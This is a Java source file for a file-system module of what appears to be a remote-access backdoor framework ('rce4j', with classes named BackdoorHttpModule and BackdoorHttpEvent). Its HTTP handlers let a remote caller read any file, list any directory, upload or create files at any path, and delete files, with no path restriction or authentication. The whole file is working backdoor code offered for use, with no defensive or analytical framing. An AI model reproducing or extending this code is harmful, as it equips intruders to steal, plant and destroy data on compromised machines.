package org.rce4j.module.impl.http;

import net.chococaker.jjason.JsonArray;
import net.chococaker.jjason.JsonObject;
import net.chococaker.jjason.JsonPrimitive;
import org.rce4j.exception.HttpException;
import org.rce4j.io.FileMetadata;
import org.rce4j.module.BackdoorHttpModule;
import org.rce4j.module.event.BackdoorHttpEvent;
import org.rce4j.net.HttpCode;
import org.rce4j.net.RequestType;
import org.rce4j.net.UploadedFile;
import org.rce4j.validator.JsonObjectValidator;
import org.rce4j.validator.JsonPrimitiveValidator;

import java.io.*;
import java.nio.file.InvalidPathException;
import java.nio.file.Path;
import java.util.Map;

public class FileSystemModule extends BackdoorHttpModule {
    public FileSystemModule() {
        super("filesys", "/filesys", Map.of(
                RequestType.POST, new JsonObjectValidator(Map.of(
                        "name", new JsonPrimitiveValidator(String.class),
                        "isFile", new JsonPrimitiveValidator(boolean.class)
                ))));
    }
    
    @Override
    public void onGet(BackdoorHttpEvent event) throws HttpException {
        File file = getExistingFileOf(event);
        
        String metaParam = event.getQueryParam("meta");
        boolean meta;
        
        if ("true".equalsIgnoreCase(metaParam)) {
            meta = true;
        } else if ("false".equalsIgnoreCase(metaParam) || metaParam == null) {
            meta = false;
        } else {
            throw new HttpException(400, "meta must be true or false");
        }
        
        boolean isDirectory = file.isDirectory();
        if (isDirectory && meta) { // is a directory, is getting metadata
            JsonObject response = new JsonObject();
            response.set("isDirectory", new JsonPrimitive(true));
            
            JsonObject metadataJson;
            try {
                metadataJson = getDataOf(file);
            } catch (IOException e) {
                throw new HttpException(HttpCode.INTERNAL_SERVER_ERROR_500, e.getMessage());
            }
            
            response.set("metadata", metadataJson);
            
            File[] fileList = file.listFiles();
            
            assert fileList != null;
            JsonArray fileListJson = new JsonArray();
            
            for (File child : fileList) {
                try {
                    fileListJson.add(getDataOf(child));
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            }
            
            response.set("children", fileListJson);
            
            event.respondJson(response);
        } else if (!isDirectory && meta) { // is a file, is getting metadata
            try {
                event.respondJson(getDataOf(file));
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        } else if (isDirectory) { // is a directory, is not getting metadata
            throw new HttpException(404, "File is a directory");
        } else { // is not a directory, is not getting metadata
            try {
                event.respond(new FileInputStream(file));
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            }
        }
    }
    
    @Override
    public void onPost(BackdoorHttpEvent event) throws HttpException {
        File pathFile = getFileOf(event);
        
        if (event.getUploadedFiles().isEmpty()) {
            String resourceName = event.getBody().getAsJsonPrimitive("name").getAsString();
            boolean isFile = event.getBody().getAsJsonPrimitive("isFile").getAsBoolean();
            
            File createdFile = new File(pathFile, resourceName);
            
            boolean wasCreated;
            if (isFile) {
                try {
                    wasCreated = createdFile.createNewFile();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
            } else
                wasCreated = createdFile.mkdirs();
            
            if (!wasCreated)
                throw new HttpException(409, "Resource \"" + createdFile.getName() + "\" already exists");
        } else {
            HttpException err = null;
            
            for (UploadedFile uploadedFile : event.getUploadedFiles()) {
                File fileToUpload = new File(pathFile, uploadedFile.getName());
                try (InputStream in = uploadedFile.getInputStream()) {
                    if (!fileToUpload.createNewFile()) {
                        err = new HttpException(409, "Resource " + uploadedFile.getName() + " already exists");
                        continue;
                    }
                    
                    in.transferTo(new FileOutputStream(fileToUpload, false));
                } catch (IOException e) {
                    err = new HttpException(500, e);
                }
            }
            
            if (err != null)
                throw err;
        }
        
        event.status(201);
    }
    
    @Override
    public void onDelete(BackdoorHttpEvent event) throws HttpException {
        File file = getFileOf(event);
        
        if (!file.delete()) {
            throw new HttpException(404, "Resource not found");
        }
        
        event.status(204);
    }
    
    private File getFileOf(BackdoorHttpEvent event) throws HttpException {
        String pathString = event.getQueryParam("path");
        if (pathString == null)
            throw new HttpException(400, "Path required");
        
        try {
            return Path.of(pathString).toFile();
        } catch (InvalidPathException ignored) {
            throw new HttpException(400, "Invalid path \"" + pathString + "\"");
        }
    }
    
    private File getExistingFileOf(BackdoorHttpEvent event) throws HttpException {
        File file = getFileOf(event);
        
        if (!file.exists())
            throw new HttpException(404);
        
        return file;
    }
    
    private static JsonObject getDataOf(File file) throws IOException {
        JsonObject fileDataJson = new JsonObject();
        FileMetadata metadata = new FileMetadata(file);
        
        fileDataJson.set("isDirectory", new JsonPrimitive(file.isDirectory()));
        fileDataJson.set("name", new JsonPrimitive(file.getName()));
        
        JsonObject metadataJson = new JsonObject();
        metadataJson.set("creation-time", new JsonPrimitive(metadata.getCreationTime()));
        metadataJson.set("hidden", new JsonPrimitive(metadata.isHidden()));
        metadataJson.set("last-access-time", new JsonPrimitive(metadata.getLastAccessTime()));
        metadataJson.set("last-modified-time", new JsonPrimitive(metadata.getLastModifiedTime()));
        metadataJson.set("size", new JsonPrimitive(metadata.getSize()));
        
        fileDataJson.set("metadata", metadataJson);
        
        return fileDataJson;
    }
}
